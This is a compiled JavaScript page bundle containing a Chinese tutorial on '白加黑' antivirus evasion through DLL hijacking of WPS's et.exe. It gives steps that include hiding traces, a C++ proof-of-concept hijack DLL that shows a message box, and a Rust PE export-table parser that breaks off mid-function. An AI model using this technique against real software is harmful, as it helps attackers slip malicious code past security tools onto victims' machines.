import{_ as e,K as o,L as c,M as n,N as s,a5 as t,W as p,F as l}from"./framework-edebdfe1.js";const i={},u=p('<h1 id="白加黑" tabindex="-1"><a class="header-anchor" href="#白加黑" aria-hidden="true">#</a> 白加黑</h1><div class="hint-container warning"><p class="hint-container-title">DeeLMind 提示</p><p>白加黑不一定可以绕过，只是一种方案</p></div><h2 id="什么是白加黑" tabindex="-1"><a class="header-anchor" href="#什么是白加黑" aria-hidden="true">#</a> 什么是白加黑</h2><p>“白加黑”通常是指一种绕过杀毒软件（或安全软件）检测的技术，其中“白”指合法的、被信任的文件或进程，“黑”指恶意的代码。利用“白加黑免杀”技术，攻击者将恶意代码与合法文件或进程结合在一起，以避开杀毒软件的检测。</p>',4),k={id:"如何制作",tabindex:"-1"},r=n("a",{class:"header-anchor",href:"#如何制作","aria-hidden":"true"},"#",-1),d={href:"https://forum.deelmind.com/d/2-wei-xin-qqqun-nei-zhi-bo-ke-cheng",target:"_blank",rel:"noopener noreferrer"},v=n("ul",null,[n("li",null,"DLL劫持")],-1),m={id:"dll劫持",tabindex:"-1"},b=n("a",{class:"header-anchor",href:"#dll劫持","aria-hidden":"true"},"#",-1),_={href:"https://forum.deelmind.com/d/2-wei-xin-qqqun-nei-zhi-bo-ke-cheng",target:"_blank",rel:"noopener noreferrer"},f=p(`<ul><li>目标程序选择(wps et.exe)</li><li>分析DLL加载顺序</li><li>创建恶意DLL</li><li>将恶意DLL放置在正确的位置</li><li>执行目标程序</li><li>隐藏踪迹</li></ul><div class="language-c++ line-numbers-mode" data-ext="c++"><pre class="language-c++"><code>#include &quot;pch.h&quot;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

__declspec(dllexport) void __stdcall  _force_link_krpt(void) {
    MessageBoxA(NULL, &quot;HiJack&quot;, &quot;DLL_force_link_krpt&quot;, 0);
}

BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, &quot;HiJack&quot;, &quot;DLL_DllMain&quot;, 0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-rust line-numbers-mode" data-ext="rs"><pre class="language-rust"><code><span class="token comment">// Prevents additional console window on Windows in release, DO NOT REMOVE!!</span>
<span class="token attribute attr-name">#![cfg_attr(not(debug_assertions), windows_subsystem = <span class="token string">&quot;windows&quot;</span>)]</span>

<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token punctuation">{</span><span class="token keyword">self</span><span class="token punctuation">,</span> <span class="token class-name">Read</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token punctuation">{</span><span class="token class-name">Write</span><span class="token punctuation">,</span> <span class="token class-name">Result</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">ImageDosHeader</span> <span class="token punctuation">{</span>
    e_magic<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span> <span class="token comment">// &quot;MZ&quot;</span>
    e_cblp<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_cp<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_crlc<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_cparhdr<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_minalloc<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_maxalloc<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_ss<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_sp<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_csum<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_ip<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_cs<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_lfarlc<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_ovno<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_res<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">u16</span><span class="token punctuation">;</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    e_oemid<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_oeminfo<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    e_res2<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">u16</span><span class="token punctuation">;</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    e_lfanew<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span> <span class="token comment">// PE header offset</span>
<span class="token punctuation">}</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">ImageFileHeader</span> <span class="token punctuation">{</span>
    machine<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    number_of_sections<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    time_date_stamp<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    pointer_to_symbol_table<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    number_of_symbols<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_optional_header<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    characteristics<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">ImageOptionalHeader32</span> <span class="token punctuation">{</span>
    magic<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    major_linker_version<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span>
    minor_linker_version<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span>
    size_of_code<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_initialized_data<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_uninitialized_data<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    address_of_entry_point<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    base_of_code<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    base_of_data<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    image_base<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    section_alignment<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    file_alignment<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    major_operating_system_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    minor_operating_system_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    major_image_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    minor_image_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    major_subsystem_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    minor_subsystem_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    win32_version_value<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_image<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_headers<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    check_sum<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    subsystem<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    dll_characteristics<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    size_of_stack_reserve<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_stack_commit<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_heap_reserve<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_heap_commit<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    loader_flags<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    number_of_rva_and_sizes<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    export_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    import_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    resource_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    exception_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    certificate_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    base_relocation_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    debug<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    architecture<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    global_ptr<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    tls_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    load_config_table<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    bound_import<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    iat<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    delay_import_descriptor<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    clr_runtime_header<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
    reserved<span class="token punctuation">:</span> <span class="token class-name">DataDirectory</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">DataDirectory</span> <span class="token punctuation">{</span>
    virtual_address<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">ImageSectionHeader</span> <span class="token punctuation">{</span>
    name<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">;</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    virtual_size<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    virtual_address<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    size_of_raw_data<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    pointer_to_raw_data<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    pointer_to_relocations<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    pointer_to_linenumbers<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    number_of_relocations<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    number_of_linenumbers<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    characteristics<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token attribute attr-name">#[derive(Debug)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">ImageExportDirectory</span> <span class="token punctuation">{</span>
    characteristics<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    time_date_stamp<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    major_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    minor_version<span class="token punctuation">:</span> <span class="token keyword">u16</span><span class="token punctuation">,</span>
    name<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    base<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    number_of_functions<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    number_of_names<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>
    address_of_functions<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>    <span class="token comment">// RVA from base of image</span>
    address_of_names<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>        <span class="token comment">// RVA from base of image</span>
    address_of_name_ordinals<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span> <span class="token comment">// RVA from base of image</span>
<span class="token punctuation">}</span>

<span class="token keyword">fn</span> <span class="token function-definition function">rva_to_offset</span><span class="token punctuation">(</span>rva<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span> sections<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token class-name">ImageSectionHeader</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> section <span class="token keyword">in</span> sections <span class="token punctuation">{</span>
        <span class="token keyword">if</span> rva <span class="token operator">&gt;=</span> section<span class="token punctuation">.</span>virtual_address <span class="token operator">&amp;&amp;</span> rva <span class="token operator">&lt;</span> section<span class="token punctuation">.</span>virtual_address <span class="token operator">+</span> section<span class="token punctuation">.</span>virtual_size <span class="token punctuation">{</span>
            <span class="token keyword">let</span> offset <span class="token operator">=</span> rva <span class="token operator">-</span> section<span class="token punctuation">.</span>virtual_address <span class="token operator">+</span> section<span class="token punctuation">.</span>pointer_to_raw_data<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>offset <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">None</span>
<span class="token punctuation">}</span>

<span class="token keyword">fn</span> <span class="token function-definition function">parse_pe_export_table</span><span class="token punctuation">(</span>file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> buffer <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    file<span class="token punctuation">.</span><span class="token function">read_to_end</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> buffer<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token comment">// 解析 DOS 头</span>
    <span class="token keyword">let</span> dos_header <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token class-name">ImageDosHeader</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> dos_header<span class="token punctuation">.</span>e_magic <span class="token operator">!=</span> <span class="token number">0x5A4D</span> <span class="token punctuation">{</span> <span class="token comment">// &quot;MZ&quot;</span>
        <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Error</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">ErrorKind</span><span class="token punctuation">::</span><span class="token class-name">InvalidData</span><span class="token punctuation">,</span> <span class="token string">&quot;Invalid PE file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 解析 PE 头</span>
    <span class="token keyword">let</span> pe_header_offset <span class="token operator">=</span> dos_header<span class="token punctuation">.</span>e_lfanew <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> file_header <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>pe_header_offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token class-name">ImageFileHeader</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 解析 Optional Header（假设是 32 位）</span>
    <span class="token keyword">let</span> optional_header <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span>
        <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>pe_header_offset <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token class-name">ImageOptionalHeader32</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 解析 Section Headers</span>
    <span class="token keyword">let</span> section_headers_offset <span class="token operator">=</span> pe_header_offset <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">+</span> file_header<span class="token punctuation">.</span>size_of_optional_header <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> section_headers <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span>
        <span class="token namespace">std<span class="token punctuation">::</span>slice<span class="token punctuation">::</span></span><span class="token function">from_raw_parts</span><span class="token punctuation">(</span>
            buffer<span class="token punctuation">[</span>section_headers_offset<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token class-name">ImageSectionHeader</span><span class="token punctuation">,</span>
            file_header<span class="token punctuation">.</span>number_of_sections <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 定位导出表</span>
    <span class="token keyword">let</span> export_directory_rva <span class="token operator">=</span> optional_header<span class="token punctuation">.</span>export_table<span class="token punctuation">.</span>virtual_address<span class="token punctuation">;</span>
    <span class="token keyword">let</span> export_directory_offset <span class="token operator">=</span> <span class="token function">rva_to_offset</span><span class="token punctuation">(</span>export_directory_rva<span class="token punctuation">,</span> section_headers<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">ok_or_else</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Error</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">ErrorKind</span><span class="token punctuation">::</span><span class="token class-name">InvalidData</span><span class="token punctuation">,</span> <span class="token string">&quot;Export directory not found&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> export_directory <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span>
        <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>export_directory_offset<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token class-name">ImageExportDirectory</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 获取名称指针列表</span>
    <span class="token keyword">let</span> name_rvas_offset <span class="token operator">=</span> <span class="token function">rva_to_offset</span><span class="token punctuation">(</span>export_directory<span class="token punctuation">.</span>address_of_names<span class="token punctuation">,</span> section_headers<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">ok_or_else</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Error</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">ErrorKind</span><span class="token punctuation">::</span><span class="token class-name">InvalidData</span><span class="token punctuation">,</span> <span class="token string">&quot;Name RVAs not found&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> name_rvas <span class="token operator">=</span> <span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span>name_rvas_offset<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> <span class="token keyword">mut</span> function_names <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>export_directory<span class="token punctuation">.</span>number_of_names <span class="token punctuation">{</span>
        <span class="token keyword">let</span> name_rva <span class="token operator">=</span> <span class="token keyword">unsafe</span> <span class="token punctuation">{</span> <span class="token operator">*</span><span class="token punctuation">(</span>name_rvas<span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i <span class="token keyword">as</span> <span class="token keyword">usize</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token keyword">u32</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> name_offset <span class="token operator">=</span> <span class="token function">rva_to_offset</span><span class="token punctuation">(</span>name_rva<span class="token punctuation">,</span> section_headers<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">ok_or_else</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Error</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">ErrorKind</span><span class="token punctuation">::</span><span class="token class-name">InvalidData</span><span class="token punctuation">,</span> <span class="token string">&quot;Function name not found&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> name_end <span class="token operator">=</span> buffer<span class="token punctuation">[</span>name_offset<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">position</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token operator">&amp;</span>c<span class="token closure-punctuation punctuation">|</span></span> c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> function_name <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span>name_offset<span class="token punctuation">..</span>name_offset <span class="token operator">+</span> name_end<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        function_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>function_name<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token class-name">Ok</span><span class="token punctuation">(</span>function_names<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">fn</span> <span class="token function-definition function">extract_base_name</span><span class="token punctuation">(</span>mangled_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 去除前缀 \`?_\`</span>
    <span class="token keyword">let</span> trimmed_name <span class="token operator">=</span> mangled_name<span class="token punctuation">.</span><span class="token function">strip_prefix</span><span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 查找第一个 &#39;@&#39; 符号的位置</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span> <span class="token operator">=</span> trimmed_name<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">&#39;@&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> base_name <span class="token operator">=</span> <span class="token operator">&amp;</span>trimmed_name<span class="token punctuation">[</span><span class="token punctuation">..</span>pos<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">// 查找最后一个 &#39;@&#39; 符号的位置（如果有的话）</span>
